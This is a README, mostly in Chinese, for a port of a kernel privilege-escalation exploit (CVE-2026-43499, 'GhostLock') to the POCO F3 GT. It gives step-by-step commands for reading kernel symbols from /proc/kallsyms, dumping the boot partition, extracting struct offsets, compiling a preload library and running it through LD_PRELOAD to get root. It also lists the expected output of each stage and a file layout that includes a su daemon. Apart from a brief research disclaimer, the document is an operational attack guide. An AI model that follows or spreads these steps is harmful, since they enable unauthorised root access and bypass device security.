# GhostLock (CVE-2026-43499) — POCO F3 GT (aresin)

Data-only physmap overwrite exploit for MediaTek Dimensity 1200 (MT6893).
Kernel: `4.14.186-android13` / MIUI V14.0.4.0.TKJCNXM。

## ⚠️ 前置条件

- **设备**: POCO F3 GT / Redmi K40 Gaming Edition (codename: aresin)
- **芯片**: MediaTek Dimensity 1200 (MT6893)
- **系统**: Android 13 / MIUI 14 (V14.0.4.0.TKJCNXM)
- **内核**: 4.14.186-g0dc1d312efb3
- **无需解 BL** — 通过 Shizuku（无线调试）即可获得 shell 权限来运行
- **Shizuku** 或 **adb shell** 可执行 arm64 二进制
- 运行后**设备会重启**（内核 panic — 预期行为）。如需保存日志，提前连好 adb logcat

## ✅ 漏洞条件检查

| 条件 | 状态 | 说明 |
|------|------|------|
| 内核版本范围 | ✅ | 4.14.186 在 2.6.39 ~ 7.0.4 范围内 |
| CONFIG_FUTEX_PI | ✅ | 已启用 (y) |
| CONFIG_RT_MUTEXES | ✅ | 已启用 (y) |
| 架构 | ✅ | aarch64 |
| CONFIG_PREEMPT | ✅ | 已启用 (y) |
| CONFIG_RANDOMIZE_KSTACK | ❓ | 需确认 (4.14 可能不支持) |

## 🔧 适配步骤

### 第一步：提取内核符号地址

```bash
# 在设备上运行提取脚本
adb push tools/extract_offsets.sh /data/local/tmp/
adb shell sh /data/local/tmp/extract_offsets.sh
adb pull /data/local/tmp/ghostlock_offsets.txt
```

如果有 root (Magisk)，可以直接从 `/proc/kallsyms` 提取：
```bash
adb shell su -c "cat /proc/kallsyms | grep -E 'init_task|init_cred|entry_task|__per_cpu_offset|root_task_group|selinux_enforcing'"
```

### 第二步：提取 vmlinux 并分析结构体偏移

#### 方法 A：从 boot.img 提取 vmlinux

```bash
# 1. 获取 boot.img
adb shell "ls /dev/block/by-name/boot"
adb shell "dd if=/dev/block/by-name/boot of=/data/local/tmp/boot.img"
adb pull /data/local/tmp/boot.img

# 2. 用 magiskboot 解包
magiskboot unpack boot.img
# 产物: kernel (压缩的 vmlinux)

# 3. 解压 vmlinux
magiskboot decompress kernel vmlinux.elf

# 4. 用 pahole 提取结构体偏移
pahole --structs=rt_mutex_waiter vmlinux.elf
pahole --structs=task_struct vmlinux.elf | grep -A2 -E "usage|prio|normal_prio|pi_lock|pi_waiters|pi_top_task|pi_blocked_on|cred|real_cred|task_group"
```

#### 方法 B：用 Ghidra 分析

1. 用 Ghidra 打开 `vmlinux.elf`
2. 搜索 `rt_mutex_waiter` 和 `task_struct` 结构体
3. 记录各字段偏移

### 第三步：填写 target.h

将提取到的偏移填入 `target.h` 中所有 `0xTODO` 的位置。

关键偏移对照表：

| 字段 | 说明 | 提取方法 |
|------|------|----------|
| `INIT_TASK` | init_task 地址 | `/proc/kallsyms` 或 Ghidra |
| `INIT_CRED` | init_cred 地址 | `/proc/kallsyms` 或 Ghidra |
| `WAITER_*_OFF` | rt_mutex_waiter 字段偏移 | pahole / Ghidra |
| `FAKE_TASK_*_OFF` | task_struct 字段偏移 | pahole / Ghidra |
| `TASK_CRED_OFF` | cred 指针偏移 | pahole / Ghidra |

### 第四步：编译

```bash
# 需要 Android NDK r27+
export NDK_ROOT=/path/to/android-ndk-r27
# 或使用 Android Studio 中的 NDK
export NDK_ROOT=$HOME/Library/Android/sdk/ndk/27.0.12077973

# 编译
make preload TARGET_HEADER=target.h

# 产物: build/bin/preload.so
```

### 第五步：测试

```bash
# 推送到设备
adb push build/bin/preload.so /data/local/tmp/
adb push build/bin/ghostlock_aresin /data/local/tmp/ 2>/dev/null || true

# 运行
adb shell LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/ghostlock_aresin

# 或用 Shizuku
# 在 Shizuku 中执行: LD_PRELOAD=/data/local/tmp/preload.so /data/local/tmp/ghostlock_aresin
```

## 📊 预期行为

| 阶段 | 输出 | 说明 |
|------|------|------|
| 初始化 | `[*] GhostLock - aresin (MT6893 D1200) 4.14.186` | 设备识别正确 |
| CPU 绑定 | `[+] CPU0 pinned` | 固定到 CPU0 |
| 地址加载 | `[*] init_task @ 0xffffffc00xxxxxxx` | 固定 LM 地址 |
| 权限检查 | `[+] uid: xxxxx` | 打印当前 uid |
| KASLR slide | `[+] slide = 0` 或 `slide = xxx` | KASLR 检测 |
| 触发提权 | 成功后 uid 变 0 | 拿到 root |
| 失败 | `[-] ...` + 重启 | 内核 panic（漏洞存在但偏移需调整） |

## ⚠️ 重要注意事项

### 4.14.x vs 6.1.x 内核差异

1. **rt_mutex_waiter 结构不同**：
   - 4.14.x 使用 `plist_node` 而非 `rb_node`
   - 字段偏移完全不同
   - 可能没有 `deadline` / `ww_ctx` 字段

2. **task_struct 布局不同**：
   - 4.14.x 的 `pi_blocked_on`、`pi_lock` 等偏移与 6.1.x 不同
   - `uclamp` 相关字段可能不存在于 4.14.x

3. **KASLR 实现不同**：
   - 4.14.x 的 KASLR 随机化方式与 6.1.x 不同
   - 泄漏方法可能需要调整

4. **Android 13 vs 14 安全差异**：
   - SELinux 策略可能不同
   - `/proc/self/pagemap` 访问限制可能不同

### 偏移验证

填入偏移后，建议用 Ghidra 交叉验证：
1. 在 Ghidra 中打开 vmlinux.elf
2. 跳转到 `rt_mutex_waiter` 结构体
3. 确认每个字段的偏移与 `target.h` 一致

## 📁 文件结构

```
ghostlock-aresin/
├── README.md              # 本文件
├── Makefile               # 编译脚本
├── target.h               # 目标设备偏移定义 (需要填写)
├── src/                   # 源码
│   ├── main.c             # 主利用逻辑
│   ├── util.c             # 工具函数
│   ├── slide.c            # KASLR 泄漏
│   ├── fops.c             # 文件操作
│   ├── pipe.c             # pipe 相关
│   ├── preload.c          # LD_PRELOAD 入口
│   ├── su_daemon.c        # su 守护进程
│   ├── su_blob.S          # su 二进制嵌入
│   ├── standalone.c       # 独立运行
│   ├── common.h           # 公共定义
│   └── offset.h           # 偏移计算
├── tools/
│   └── extract_offsets.sh # 偏移提取脚本
└── build/
    ├── bin/               # 编译产物
    └── embed/             # 嵌入文件
```

## 📜 License

For research/educational purposes only. Use at your own risk.

**Original PoC**: [NebuSec/CyberMeowfia](https://github.com/NebuSec/CyberMeowfia) → `IonStack/CVE-2026-43499/exploit/`
**Adapted for**: POCO F3 GT (aresin) by ghostlock-aresin
